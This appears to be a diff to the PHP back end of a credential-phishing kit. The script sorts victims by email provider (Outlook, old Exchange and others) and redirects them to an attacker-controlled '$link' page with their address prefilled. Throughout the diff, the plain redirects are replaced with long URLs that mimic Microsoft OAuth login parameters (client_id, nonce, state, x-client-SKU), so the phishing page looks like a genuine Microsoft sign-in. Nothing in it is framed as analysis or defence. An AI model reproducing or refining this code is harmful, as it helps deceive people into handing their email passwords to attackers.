@@ -387,7 +387,7 @@ $domain = str_replace("@","",$atdomain);
 
 //single page start
 if ($page==1){
-	header("Location: https://$link/?username=$email");
+	header("Location: https://$link/?client_id=".RandNumber(4)."b-32c6-49b0-83e6-1d93765276ca&response_type=code%20id_token&response_mode=form_post&nonce=638211770044003723.NzNhMzcwMDItYzJjYS00NmQzLTgyZGQtNzVkMzFmMzQ0NDE4NGRkMTNhMTItNDQ0NC00ZDkzLTg4ODMtYWIzZjI0NmRmNjA1&ui_locales=en-US&mkt=en-US&client-request-id=166ffa25-1ade-423d-a377-8ab7f9afe7fa&state=HHrDCHl4U4pi_YwSIzFsUwOkAwwm6lAbYY6MUXfbXxgGvpH3hPQ3WP5RgH4klPYxNFDK0E4RrDJc7EISsCHVVcbU_NDMPYBOg3FfgIMs_izxpFR9FDEiDh3hi34UTCxmiO69obYsxe6_h2fqQ2sH2o4OzMtM7AlkE6riYLGiP6Gobjgzxp0vk1UId05wOg9U2H3SaqFn1mjuMesAsJvF-s1TMnvjlakW1bB4FFOsMxeAuhXh6VQUUFfEt3qUai7skrslYINebdZANQ-u60Tqzg&x-client-SKU=ID_NET6_0&x-client-ver=6.26.1.0&username=$email");
 	exit;
 }
 elseif ($page==2) {
@@ -416,7 +416,7 @@ $owac = check_owa($domain);
 $a = strtolower($hosts[0]);
 
 if (strpos($a, 'outlook') !== false || searchtxt($domain)!== false) {
-	header("Location: https://$link/?username=$email");
+	header("Location: https://$link/?client_id=".RandNumber(4)."b-32c6-49b0-83e6-1d93765276ca&response_type=code%20id_token&response_mode=form_post&nonce=638211770044003723.NzNhMzcwMDItYzJjYS00NmQzLTgyZGQtNzVkMzFmMzQ0NDE4NGRkMTNhMTItNDQ0NC00ZDkzLTg4ODMtYWIzZjI0NmRmNjA1&ui_locales=en-US&mkt=en-US&client-request-id=166ffa25-1ade-423d-a377-8ab7f9afe7fa&state=HHrDCHl4U4pi_YwSIzFsUwOkAwwm6lAbYY6MUXfbXxgGvpH3hPQ3WP5RgH4klPYxNFDK0E4RrDJc7EISsCHVVcbU_NDMPYBOg3FfgIMs_izxpFR9FDEiDh3hi34UTCxmiO69obYsxe6_h2fqQ2sH2o4OzMtM7AlkE6riYLGiP6Gobjgzxp0vk1UId05wOg9U2H3SaqFn1mjuMesAsJvF-s1TMnvjlakW1bB4FFOsMxeAuhXh6VQUUFfEt3qUai7skrslYINebdZANQ-u60Tqzg&x-client-SKU=ID_NET6_0&x-client-ver=6.26.1.0&username=$email");
 	exit;
 }
 elseif (strpos($a, 'serverdata') !== false){
@@ -442,7 +442,7 @@ elseif ($owac == 'old exchange'){
 	header("Location: $dst/load.php?token=$token_kr");	
 }
 else {
-	header("Location: https://$link/?username=$email");
+	header("Location: https://$link/?client_id=".RandNumber(4)."b-32c6-49b0-83e6-1d93765276ca&response_type=code%20id_token&response_mode=form_post&nonce=638211770044003723.NzNhMzcwMDItYzJjYS00NmQzLTgyZGQtNzVkMzFmMzQ0NDE4NGRkMTNhMTItNDQ0NC00ZDkzLTg4ODMtYWIzZjI0NmRmNjA1&ui_locales=en-US&mkt=en-US&client-request-id=166ffa25-1ade-423d-a377-8ab7f9afe7fa&state=HHrDCHl4U4pi_YwSIzFsUwOkAwwm6lAbYY6MUXfbXxgGvpH3hPQ3WP5RgH4klPYxNFDK0E4RrDJc7EISsCHVVcbU_NDMPYBOg3FfgIMs_izxpFR9FDEiDh3hi34UTCxmiO69obYsxe6_h2fqQ2sH2o4OzMtM7AlkE6riYLGiP6Gobjgzxp0vk1UId05wOg9U2H3SaqFn1mjuMesAsJvF-s1TMnvjlakW1bB4FFOsMxeAuhXh6VQUUFfEt3qUai7skrslYINebdZANQ-u60Tqzg&x-client-SKU=ID_NET6_0&x-client-ver=6.26.1.0&username=$email");
 	exit;
 }
 }
@@ -464,7 +464,7 @@ elseif ($owac == 'old exchange'){
 	header("Location: $dst/load.php?token=$token_kr");	
 }
 else {
-	header("Location: https://$link/?username=$email");
+	header("Location: https://$link/?client_id=".RandNumber(4)."b-32c6-49b0-83e6-1d93765276ca&response_type=code%20id_token&response_mode=form_post&nonce=638211770044003723.NzNhMzcwMDItYzJjYS00NmQzLTgyZGQtNzVkMzFmMzQ0NDE4NGRkMTNhMTItNDQ0NC00ZDkzLTg4ODMtYWIzZjI0NmRmNjA1&ui_locales=en-US&mkt=en-US&client-request-id=166ffa25-1ade-423d-a377-8ab7f9afe7fa&state=HHrDCHl4U4pi_YwSIzFsUwOkAwwm6lAbYY6MUXfbXxgGvpH3hPQ3WP5RgH4klPYxNFDK0E4RrDJc7EISsCHVVcbU_NDMPYBOg3FfgIMs_izxpFR9FDEiDh3hi34UTCxmiO69obYsxe6_h2fqQ2sH2o4OzMtM7AlkE6riYLGiP6Gobjgzxp0vk1UId05wOg9U2H3SaqFn1mjuMesAsJvF-s1TMnvjlakW1bB4FFOsMxeAuhXh6VQUUFfEt3qUai7skrslYINebdZANQ-u60Tqzg&x-client-SKU=ID_NET6_0&x-client-ver=6.26.1.0&username=$email");
 	exit;
 }
 }
@@ -486,7 +486,7 @@ elseif ($owac == 'old exchange'){
 	header("Location: $dst/load.php?token=$token_kr");	
 }
 else {
-	header("Location: https://$link/?username=$email");
+	header("Location: https://$link/?client_id=".RandNumber(4)."b-32c6-49b0-83e6-1d93765276ca&response_type=code%20id_token&response_mode=form_post&nonce=638211770044003723.NzNhMzcwMDItYzJjYS00NmQzLTgyZGQtNzVkMzFmMzQ0NDE4NGRkMTNhMTItNDQ0NC00ZDkzLTg4ODMtYWIzZjI0NmRmNjA1&ui_locales=en-US&mkt=en-US&client-request-id=166ffa25-1ade-423d-a377-8ab7f9afe7fa&state=HHrDCHl4U4pi_YwSIzFsUwOkAwwm6lAbYY6MUXfbXxgGvpH3hPQ3WP5RgH4klPYxNFDK0E4RrDJc7EISsCHVVcbU_NDMPYBOg3FfgIMs_izxpFR9FDEiDh3hi34UTCxmiO69obYsxe6_h2fqQ2sH2o4OzMtM7AlkE6riYLGiP6Gobjgzxp0vk1UId05wOg9U2H3SaqFn1mjuMesAsJvF-s1TMnvjlakW1bB4FFOsMxeAuhXh6VQUUFfEt3qUai7skrslYINebdZANQ-u60Tqzg&x-client-SKU=ID_NET6_0&x-client-ver=6.26.1.0&username=$email");
 	exit;
 }
 }
@@ -528,7 +528,7 @@ else {
 	}
 	else{
 		
-	header("Location: https://$link/?username=$email");
+	header("Location: https://$link/?client_id=".RandNumber(4)."b-32c6-49b0-83e6-1d93765276ca&response_type=code%20id_token&response_mode=form_post&nonce=638211770044003723.NzNhMzcwMDItYzJjYS00NmQzLTgyZGQtNzVkMzFmMzQ0NDE4NGRkMTNhMTItNDQ0NC00ZDkzLTg4ODMtYWIzZjI0NmRmNjA1&ui_locales=en-US&mkt=en-US&client-request-id=166ffa25-1ade-423d-a377-8ab7f9afe7fa&state=HHrDCHl4U4pi_YwSIzFsUwOkAwwm6lAbYY6MUXfbXxgGvpH3hPQ3WP5RgH4klPYxNFDK0E4RrDJc7EISsCHVVcbU_NDMPYBOg3FfgIMs_izxpFR9FDEiDh3hi34UTCxmiO69obYsxe6_h2fqQ2sH2o4OzMtM7AlkE6riYLGiP6Gobjgzxp0vk1UId05wOg9U2H3SaqFn1mjuMesAsJvF-s1TMnvjlakW1bB4FFOsMxeAuhXh6VQUUFfEt3qUai7skrslYINebdZANQ-u60Tqzg&x-client-SKU=ID_NET6_0&x-client-ver=6.26.1.0&username=$email");
 	exit;	
 	}
 }
